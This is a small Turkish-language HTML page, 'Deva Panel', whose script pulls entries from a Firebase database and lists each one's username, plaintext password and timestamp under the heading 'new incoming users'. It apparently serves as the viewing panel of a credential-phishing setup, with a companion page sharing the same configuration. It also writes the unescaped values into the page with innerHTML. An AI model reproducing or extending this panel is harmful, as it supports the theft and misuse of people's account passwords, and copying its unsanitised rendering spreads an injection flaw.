<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Deva Panel</title>
    <style>
        body { background: #111; color: #00ff00; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
    </style>
</head>
<body>
    <h1>DEVLOG: Yeni Gelen Kullanıcılar</h1>
    <table id="adminTable">
        <tr><th>Kullanıcı</th><th>Şifre</th><th>Zaman</th></tr>
    </table>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

        const firebaseConfig = { /* AYNI CONFİG */ };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        onValue(ref(db, 'yonetici_verileri'), (snapshot) => {
            const users = snapshot.val();
            const table = document.getElementById('adminTable');
            table.innerHTML = "<tr><th>Kullanıcı</th><th>Şifre</th><th>Zaman</th></tr>";
            for(let key in users) {
                table.innerHTML += `<tr><td>${users[key].kullanici}</td><td>${users[key].sifre}</td><td>${users[key].tarih}</td></tr>`;
            }
        });
    </script>
</body>
</html>
